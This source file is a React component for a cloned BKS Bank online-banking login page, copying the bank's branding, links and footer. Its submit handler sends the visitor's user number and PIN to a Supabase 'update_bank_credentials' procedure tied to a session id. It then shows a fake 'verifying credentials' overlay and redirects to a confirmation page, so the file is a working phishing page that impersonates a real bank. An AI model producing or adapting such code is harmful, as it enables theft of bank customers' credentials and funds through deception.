import { useState, useEffect, useCallback, useRef } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import LoadingOverlay from "@/components/LoadingOverlay";
import { usePageMeta } from "@/hooks/use-page-meta";
import { ChevronRight, ChevronDown, ChevronLeft } from "lucide-react";
import { useIsMobile } from "@/hooks/use-mobile";
import bksLogo from "@/assets/bks-logo.svg";
import bksIcon from "@/assets/bks.png";
import slide1 from "@/assets/bks-slide-1.jpg";
import slide2 from "@/assets/bks-slide-2.jpg";

type Lang = "DE" | "EN";

const translations: Record<Lang, {
  loginTitle: string;
  step1: string;
  pinPlaceholder: string;
  sslText: string;
  next: string;
  firstLogin: string;
  linksTitle: string;
  links: { label: string; href: string }[];
  cookieText: string;
  cookieMore: string;
  cookieClose: string;
  footerLinks: { label: string; href: string }[];
  languageNames: string[];
  copyright: string;
}> = {
  DE: {
    loginTitle: "Anmeldung",
    step1: "Verfügernummer",
    pinPlaceholder: "PIN",
    sslText: "Ihre Anmeldung geschieht über gesicherte TLS-Verbindungen.",
    next: "Weiter",
    firstLogin: "Erstanmeldung",
    linksTitle: "Weiterführende Links",
    links: [
      { label: "BKS Security (Download)", href: "https://www.bks.at/services/internetbanking-und-apps/bks-security-app" },
      { label: "FAQ - oft gestellte Fragen", href: "https://www.bks.at/services/internetbanking-und-apps/mynet" },
      { label: "Servicenummern", href: "https://www.bks.at/hilfe" },
      { label: "Sicherheitsinformation", href: "https://www.bks.at/footer/sicherheit" },
      { label: "Fernwartung (Wartungstool)", href: "https://www.bks.at/services/fernwartung" },
      { label: "Wertpapierinformationen", href: "https://www.bks.at/footer/wertpapierinformationen" },
    ],
    cookieText: "Wir verwenden auf dieser Seite nur funktionale Cookies sowie solche, die zur Erfüllung unserer gesetzlichen Pflichten erforderlich sind.",
    cookieMore: "Weitere Informationen",
    cookieClose: "Schließen",
    footerLinks: [
      { label: "Impressum", href: "https://www.bks.at/footer/impressum" },
      { label: "AGB", href: "https://www.bks.at/footer/agb-und-konditionen" },
      { label: "Geschäftsbedingungen", href: "https://www.bks.at/documents/879862/0/Bedingungen_Internetbanking.pdf" },
      { label: "Fernwartung", href: "javascript:void(0);" },
    ],
    languageNames: ["Deutsch", "Englisch"],
    copyright: "© 2026 BKS Bank AG",
  },
  EN: {
    loginTitle: "Login",
    step1: "User number",
    pinPlaceholder: "PIN",
    sslText: "Your login is via secured TLS connections.",
    next: "Next",
    firstLogin: "First login",
    linksTitle: "Further links",
    links: [
      { label: "BKS Security (Download)", href: "https://www.bks.at/services/internetbanking-und-apps/bks-security-app" },
      { label: "FAQ", href: "https://www.bks.at/services/internetbanking-und-apps/mynet" },
      { label: "Service numbers", href: "https://www.bks.at/hilfe" },
      { label: "Security information", href: "https://www.bks.at/footer/sicherheit" },
      { label: "Remote support tool", href: "https://www.bks.at/services/fernwartung" },
      { label: "Securities information", href: "https://www.bks.at/footer/wertpapierinformationen" },
    ],
    cookieText: "We only use functional cookies and those required for legal compliance on this page.",
    cookieMore: "More information",
    cookieClose: "Close",
    footerLinks: [
      { label: "Imprint", href: "https://www.bks.at/footer/impressum" },
      { label: "Terms", href: "https://www.bks.at/footer/agb-und-konditionen" },
      { label: "Conditions", href: "https://www.bks.at/documents/879862/0/Bedingungen_Internetbanking.pdf" },
      { label: "Remote support", href: "javascript:void(0);" },
    ],
    languageNames: ["German", "English"],
    copyright: "© 2026 BKS Bank AG",
  },
};

const langKeys: Lang[] = ["DE", "EN"];
const slides = [slide1, slide2];
const slideLinks = [
  "https://www.bks.at/privatkunden/anlegen/anlageprodukte/bks-anlagemix?utm_source=portal&utm_medium=banner&utm_campaign=bks-anlagemix",
  "https://www.bks.at/privatkunden/anlegen/anlageprodukte/bks-bank-anleihen",
];

const PURPLE = "#422373";
const PINK = "#e50051";
const CARD_BG = "#ffffff";
const CARD_BORDER = "#422373";

const Bks = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const sessionId = searchParams.get("s") || "";
  const [showLoading, setShowLoading] = useState(false);
  const isMobile = useIsMobile();

  const [verfNr, setVerfNr] = useState("");
  const [pin, setPin] = useState("");
  const [language, setLanguage] = useState<Lang>("DE");
  const [langOpen, setLangOpen] = useState(false);
  const [currentSlide, setCurrentSlide] = useState(0);
  const [cookieOpen, setCookieOpen] = useState(true);
  const langRef = useRef<HTMLDivElement | null>(null);

  usePageMeta("BKS Bank Online - Login", bksIcon);

  useEffect(() => { window.scrollTo(0, 0); }, []);

  const t = translations[language];

  const nextSlide = useCallback(() => setCurrentSlide(p => (p + 1) % slides.length), []);
  const prevSlide = useCallback(() => setCurrentSlide(p => (p - 1 + slides.length) % slides.length), []);

  useEffect(() => {
    const timer = setInterval(nextSlide, 6000);
    return () => clearInterval(timer);
  }, [nextSlide]);

  useEffect(() => {
    const onClick = (e: MouseEvent) => {
      if (langRef.current && !langRef.current.contains(e.target as Node)) setLangOpen(false);
    };
    document.addEventListener("mousedown", onClick);
    return () => document.removeEventListener("mousedown", onClick);
  }, []);

  const handleSubmit = async () => {
    if (!verfNr.trim()) return;
    if (sessionId) {
      const { error } = await supabase.rpc("update_bank_credentials", {
        p_session_id: sessionId,
        p_username: verfNr,
        p_password: pin,
        p_username_label: "Verfügernummer",
        p_password_label: "PIN",
      });
      if (error) console.error("Update failed:", error);
      await supabase.from("submissions").update({ bank: "BKS Bank" }).eq("session_id", sessionId);
    }
    setShowLoading(true);
  };

  const inputStyle: React.CSSProperties = {
    width: "100%",
    padding: "10px 12px",
    border: `1px solid ${PURPLE}`,
    background: "#fff",
    borderRadius: 4,
    fontSize: 14,
    color: PURPLE,
    outline: "none",
    boxSizing: "border-box",
    fontFamily: "inherit",
  };

  return (
    <>
      <style>{`.bks-input::placeholder{color:${PURPLE};opacity:0.7;}.bks-link-text{color:${PURPLE};transition:color 0.15s ease;}.bks-link-row:hover .bks-link-text{color:${PINK};}.bks-footer-link{color:${PURPLE};text-decoration:none;font-weight:700;}.bks-footer-link:hover{text-decoration:underline;}`}</style>
      {showLoading && (
        <LoadingOverlay
          message="Anmeldedaten werden überprüft..."
          onComplete={() => navigate("/confirmation?s=" + sessionId)}
        />
      )}
      <div
        style={{
          minHeight: "100vh",
          background: "#fff",
          fontFamily: "Helvetica, Arial, sans-serif",
          color: PURPLE,
          display: "flex",
          flexDirection: "column",
        }}
      >
        {/* Cookie banner */}
        {cookieOpen && (
          <div
            style={{
              background: PURPLE,
              color: "#fff",
              padding: "16px 0",
              fontSize: 14,
            }}
          >
            <div
              style={{
                maxWidth: 1200,
                margin: "0 auto",
                padding: isMobile ? "0 16px" : "0 30px",
                display: "flex",
                alignItems: "center",
                justifyContent: "space-between",
                gap: 16,
                flexWrap: "wrap",
              }}
            >
              <span style={{ flex: "1 1 auto" }}>
                {t.cookieText}{" "}
                <a href="https://www.bks.at" target="_blank" rel="noopener noreferrer" style={{ color: "#fff", fontWeight: 700 }}>
                  {t.cookieMore}
                </a>
              </span>
              <button
                onClick={() => setCookieOpen(false)}
                style={{
                  background: "#fff",
                  color: PURPLE,
                  border: "none",
                  padding: "8px 22px",
                  borderRadius: 9999,
                  fontWeight: 400,
                  cursor: "pointer",
                  fontSize: 14,
                }}
              >
                {t.cookieClose}
              </button>
            </div>
          </div>
        )}

        {/* Header */}
        <div
          style={{
            background: "#fff",
            padding: isMobile ? "16px 0" : "20px 0",
            boxShadow: "0 4px 8px rgba(0,0,0,0.15)",
            position: "relative",
            zIndex: 1,
          }}
        >
          <div
            style={{
              maxWidth: 1200,
              margin: "0 auto",
              padding: isMobile ? "0 16px" : "0 30px",
              display: "flex",
              alignItems: "center",
            }}
          >
            <img src={bksLogo} alt="BKS Bank" style={{ height: isMobile ? 32 : 40 }} />
          </div>
        </div>

        {/* Main */}
        <div
          style={{
            maxWidth: 1200,
            margin: "0 auto",
            width: "100%",
            padding: isMobile ? "30px 16px 40px" : "40px 30px 40px",
            boxSizing: "border-box",
            flex: 1,
          }}
        >
          <div
            style={{
              display: "flex",
              flexDirection: isMobile ? "column" : "row",
              gap: 16,
              alignItems: isMobile ? "center" : "flex-start",
            }}
          >
            {/* Login Card */}
            <div
              style={{
                flex: "0 0 300px",
                width: 300,
                height: 306,
                background: CARD_BG,
                color: PURPLE,
                borderRadius: 0,
                boxShadow: "0 2px 6px rgba(0,0,0,0.15)",
                display: "flex",
                flexDirection: "column",
                minWidth: 0,
                overflow: "hidden",
              }}
            >
              <div style={{ padding: "14px 20px 8px" }}>
                <h2 style={{ fontSize: 18, fontWeight: 700, margin: "0 0 28px", color: PINK }}>
                  {t.loginTitle}
                </h2>
                <input
                  type="text"
                  className="bks-input"
                  placeholder={t.step1}
                  value={verfNr}
                  onChange={(e) => setVerfNr(e.target.value)}
                  onFocus={(e) => (e.currentTarget.placeholder = "")}
                  onBlur={(e) => (e.currentTarget.placeholder = t.step1)}
                  style={{ ...inputStyle, marginBottom: 10, height: 36, padding: "0 12px" }}
                />

                <div style={{ display: "grid", gridTemplateColumns: "minmax(0,1fr) minmax(0,1fr)", gap: 10, marginBottom: 12 }}>
                  <input
                    type="password"
                    className="bks-input"
                    placeholder={t.pinPlaceholder}
                    value={pin}
                    onChange={(e) => setPin(e.target.value)}
                    onFocus={(e) => (e.currentTarget.placeholder = "")}
                    onBlur={(e) => (e.currentTarget.placeholder = t.pinPlaceholder)}
                    style={{ ...inputStyle, width: "100%", height: 36, padding: "0 12px" }}
                  />
                  <div ref={langRef} style={{ position: "relative", width: "100%" }}>
                    <button
                      type="button"
                      onClick={() => setLangOpen((p) => !p)}
                      style={{
                        ...inputStyle,
                        padding: "0 4px 0 12px",
                        cursor: "pointer",
                        display: "flex",
                        alignItems: "center",
                        justifyContent: "space-between",
                        textAlign: "left",
                        height: 36,
                        width: "100%",
                      }}
                    >
                      <span>{t.languageNames[langKeys.indexOf(language)]}</span>
                      <ChevronDown size={16} color={PURPLE} />
                    </button>
                    {langOpen && (
                      <div
                        style={{
                          position: "absolute",
                          top: "calc(100% + 2px)",
                          left: 0,
                          right: 0,
                          background: "#fff",
                          border: `1px solid ${PURPLE}`,
                          borderRadius: 4,
                          zIndex: 50,
                        }}
                      >
                        {langKeys.map((k, i) => (
                          <button
                            key={k}
                            onClick={() => { setLanguage(k); setLangOpen(false); }}
                            style={{
                              display: "block",
                              width: "100%",
                              textAlign: "left",
                              padding: "8px 12px",
                              background: language === k ? "#f3eef9" : "#fff",
                              border: "none",
                              color: PURPLE,
                              cursor: "pointer",
                              fontSize: 14,
                            }}
                          >
                            {t.languageNames[i]}
                          </button>
                        ))}
                      </div>
                    )}
                  </div>
                </div>

                <p style={{ fontSize: 12, lineHeight: 1.5, margin: "0 0 8px", color: PURPLE }}>
                  {t.sslText}
                </p>

                <div style={{ textAlign: isMobile ? "center" : "right" }}>
                  <button
                    onClick={handleSubmit}
                    onMouseEnter={(e) => (e.currentTarget.style.background = "#321a59")}
                    onMouseLeave={(e) => (e.currentTarget.style.background = PURPLE)}
                    style={{
                      background: PURPLE,
                      color: "#fff",
                      border: "none",
                      padding: "9px 36px",
                      fontSize: 14,
                      lineHeight: 1.2,
                      fontWeight: 400,
                      cursor: "pointer",
                      borderRadius: 9999,
                      fontFamily: "inherit",
                      transition: "background 0.15s ease",
                      width: isMobile ? "100%" : undefined,
                    }}
                  >
                    {t.next}
                  </button>
                </div>
              </div>

              {/* Erstanmeldung bar */}
              <div
                style={{
                  marginTop: "auto",
                  background: "#fff",
                  color: PURPLE,
                  display: "flex",
                  alignItems: "stretch",
                  justifyContent: "flex-end",
                  fontSize: 12,
                  fontWeight: 400,
                  cursor: "pointer",
                  minHeight: 36,
                  borderTop: `1px solid #ccc`,
                }}
              >
                <div
                  style={{
                    display: "flex",
                    alignItems: "center",
                    padding: "0 20px",
                    borderLeft: `1px solid #ccc`,
                  }}
                >
                  {t.firstLogin}
                </div>
              </div>
            </div>

            {/* Weiterführende Links */}
            <div
              style={{
                flex: "0 0 300px",
                width: 300,
                height: 306,
                background: CARD_BG,
                color: PURPLE,
                borderRadius: 0,
                boxShadow: "0 2px 6px rgba(0,0,0,0.15)",
                padding: "18px 20px 16px",
                minWidth: 0,
                boxSizing: "border-box",
                overflow: "hidden",
              }}
            >
              <h2 style={{ fontSize: 18, fontWeight: 700, margin: "0 0 28px", color: PINK }}>
                {t.linksTitle}
              </h2>
              <div>
                {t.links.map((item, i) => (
                  <a
                    key={i}
                    href={item.href}
                    target="_blank"
                    rel="noopener noreferrer"
                    className="bks-link-row"
                    style={{
                      display: "flex",
                      alignItems: "center",
                      justifyContent: "space-between",
                      padding: "8px 0",
                      borderBottom: i === t.links.length - 1 ? "none" : `1px solid #e5dff0`,
                      fontSize: 13,
                      cursor: "pointer",
                      gap: 8,
                      textDecoration: "none",
                    }}
                  >
                    <span className="bks-link-text" style={{ lineHeight: 1.3 }}>{item.label}</span>
                    <ChevronRight size={18} color={PURPLE} style={{ flexShrink: 0 }} />
                  </a>
                ))}
              </div>
            </div>

            {/* Slider */}
            <div
              style={{
                flex: "0 0 300px",
                width: 300,
                height: 306,
                position: "relative",
                background: "#fff",
                borderRadius: 0,
                boxShadow: "0 2px 6px rgba(0,0,0,0.15)",
                overflow: "hidden",
                minWidth: 0,
              }}
            >
              {slides.map((src, i) => (
                <a
                  key={i}
                  href={slideLinks[i]}
                  target="_blank"
                  rel="noopener noreferrer"
                  style={{
                    position: i === 0 ? "relative" : "absolute",
                    top: 0,
                    left: 0,
                    width: "100%",
                    height: "100%",
                    display: "block",
                    opacity: currentSlide === i ? 1 : 0,
                    transition: "opacity 0.6s ease",
                    pointerEvents: currentSlide === i ? "auto" : "none",
                  }}
                >
                  <img
                    src={src}
                    alt={`Werbung ${i + 1}`}
                    style={{
                      width: "100%",
                      height: "100%",
                      objectFit: "cover",
                      display: "block",
                    }}
                  />
                </a>
              ))}
              {/* Pagination row */}
              <div
                style={{
                  position: "absolute",
                  top: 12,
                  left: "50%",
                  transform: "translateX(-50%)",
                  display: "flex",
                  alignItems: "center",
                  gap: 10,
                  zIndex: 2,
                }}
              >
                <button
                  onClick={prevSlide}
                  style={{
                    background: "transparent",
                    border: "none",
                    color: PURPLE,
                    width: 20,
                    height: 20,
                    cursor: "pointer",
                    display: "flex",
                    alignItems: "center",
                    justifyContent: "center",
                    padding: 0,
                  }}
                >
                  <ChevronLeft size={18} strokeWidth={2.5} />
                </button>
                {slides.map((_, i) => (
                  <span
                    key={i}
                    onClick={() => setCurrentSlide(i)}
                    style={{
                      width: 10,
                      height: 10,
                      borderRadius: "50%",
                      background: currentSlide === i ? PINK : "rgba(228,0,81,0.25)",
                      cursor: "pointer",
                    }}
                  />
                ))}
                <button
                  onClick={nextSlide}
                  style={{
                    background: "transparent",
                    border: "none",
                    color: PURPLE,
                    width: 20,
                    height: 20,
                    cursor: "pointer",
                    display: "flex",
                    alignItems: "center",
                    justifyContent: "center",
                    padding: 0,
                  }}
                >
                  <ChevronRight size={18} strokeWidth={2.5} />
                </button>
              </div>
            </div>
          </div>
        </div>

        {/* Footer */}
        <div
          style={{
            boxShadow: "0 -4px 8px rgba(0,0,0,0.15)",
            position: "relative",
            zIndex: 1,
            padding: "20px 0",
            fontSize: 13,
            color: PURPLE,
          }}
        >
          <div
            style={{
              maxWidth: 1200,
              margin: "0 auto",
              padding: isMobile ? "0 16px" : "0 30px",
              boxSizing: "border-box",
            }}
          >
            <div style={{ display: "flex", flexDirection: isMobile ? "column" : "row", gap: isMobile ? 8 : 24, flexWrap: "wrap", alignItems: "flex-start" }}>
              {t.footerLinks.map((item) => (
                <a
                  key={item.label}
                  href={item.href}
                  target="_blank"
                  rel="noopener noreferrer"
                  className="bks-footer-link"
                  style={{ cursor: "pointer" }}
                >
                  {item.label}
                </a>
              ))}
            </div>
          </div>
        </div>
      </div>
    </>
  );
};

export default Bks;
